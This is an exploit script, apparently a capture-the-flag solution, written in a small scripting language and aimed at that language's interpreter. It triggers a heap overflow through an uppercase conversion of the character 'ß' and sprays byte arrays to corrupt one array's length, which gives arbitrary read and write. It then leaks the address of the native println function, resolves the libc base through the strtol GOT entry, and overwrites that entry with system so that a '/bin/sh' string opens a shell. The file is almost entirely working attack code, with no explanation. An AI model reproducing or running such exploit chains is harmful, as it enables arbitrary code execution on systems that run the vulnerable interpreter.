
//var text = "Hello, World";
var outer = new [50];

var OFFSET_NATIVEPRINT_BASE = 0x8330;
var OFFSET_STRTOL_GOT = 0x140a8;
var OFFSET_STRTOL_LIBCBASE = 0x48C10; 
var OFFSET_SYSTEM_LIBC = 0x4C490;

var overflowy_string = "ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa111111111";
overflowy_string += "\x30\x00\x00\x00\x77\x00\x00\x00";
overflowy_string += "\x15\x00\x00\x00\x02\x01\x00\x00";
overflowy_string += "\x00\x41\x41\x41\x41";
overflowy_string += "";

function r64(buf, off) {
      var x = 0l;
      for (var j = 7; j >= 0; j -= 1) { x = (x << 8) | buf[off + j]; }
      return x;
  }

  function w64(V, o, val) {
    for (var j = 0; j < 8; j += 1) { V[o + j] = ((val >> (8 * j)) & 0xFF).toNumber(); }
}



for (var i = 0; i < 50; i += 1) {
    outer[i] = [0xef, 0xbe, 0xad, 0xde, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99]b;
}

//for (var i = 30; i < 50; i += 2) {
    outer[30] = null;
//}


//dumpHeap();

println("We are here");

var newstr = overflowy_string.toUpper();

println(outer[31].size());
var corrupted_buf = outer[31];

var heap_addr_aaw_buf = 0x00l;
var heap_offset_aaw = 0x00l;



for (var i = 0; i < 2000; i += 8) {
    var read = r64(corrupted_buf, i);

    println(read.format("0x%08x")  + " Offset: " + i.format("0x%08X"));

    if (read == 0x640000006400) { // Found next byte array
        var buf_len_off = i+1;
        var buf_addr_off = i+9;

        w64(corrupted_buf, i+1, 0xffffffffffffffff);
        heap_addr_aaw_buf = r64(corrupted_buf, buf_addr_off);

        heap_offset_aaw = buf_addr_off;

        println("Heap addr next AAW buf: " + heap_addr_aaw_buf.format("0x%08x") + " Buf len off: " + buf_len_off.format("0x%08X") + " Raw:" + heap_addr_aaw_buf.toString());
        break;
    }
   // var word = corrupted_buf.slice(0,8).decodeNumber(NUMBER_FORMAT_UINT64, {:offset => 0});
    //println(word);
}

var printf_native_leak = 0l;

println(outer[32].size());
var aaw_buf = outer[32];

// Scan backwars 0x1000 bytes until we find the native function
for (var i = 0; i < 1000; i += 1) {
    w64(corrupted_buf, heap_offset_aaw, heap_addr_aaw_buf-0x1000*i+1); // + 1 cause otherwise some fields we search for are not aligned
    println("Writen offset: " + (heap_addr_aaw_buf-0x1000*i+1).format("0x%08x"));

    for (var j = 0; j < 0x1000; j+=8) {
        var t = r64(aaw_buf, j);
        if (t == 0x6e6c746e697270) // "println"
         {
            printf_native_leak = r64(aaw_buf, j+8*10);
            println("[+] FOUND PRINTF FUNCTION: " + printf_native_leak.format("0x%08x"));
            break;
         }
    }
    if (printf_native_leak != 0) {
        break;
    }
}

// Resolve strtol first
"1".toNumber();

var base_addr = printf_native_leak - OFFSET_NATIVEPRINT_BASE;

println("[+] Base addr: " + base_addr.format("0x%08x"));

w64(corrupted_buf, heap_offset_aaw, base_addr);

var putchar_leak = r64(aaw_buf, OFFSET_STRTOL_GOT);

println("[+] Strtol leak: " + putchar_leak.format("0x%08x"));

var libc_base = putchar_leak  - OFFSET_STRTOL_LIBCBASE;

println("[+] libc base: " + libc_base.format("0x%08x"));

w64(aaw_buf, OFFSET_STRTOL_GOT, libc_base + OFFSET_SYSTEM_LIBC);


"/bin/sh".toNumber();


for (var i = 0; i < 50; i += 1) {
    outer[i] = null;
}

println("FINISHED");
